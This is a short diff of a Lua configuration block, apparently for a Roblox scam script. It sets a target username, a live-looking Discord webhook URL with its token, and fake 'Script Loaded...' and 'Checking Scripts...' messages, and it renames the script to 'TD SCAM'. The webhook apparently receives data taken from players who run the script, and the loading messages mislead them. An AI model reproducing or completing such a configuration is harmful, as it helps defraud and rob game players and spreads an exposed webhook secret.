@@ -1,7 +1,7 @@
 Username = "kaan2020alp"
 WebHook = "https://discord.com/api/webhooks/1073568739355799612/SM1YGBvTP0v-Kke9HD3KE3dEfrYK5sGbPPpT-knqDrCkQTdCSJaada8fddSQc5hBDNGF"
 
-_G.CustomScriptName = "Coen"
+_G.CustomScriptName = "TD SCAM"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
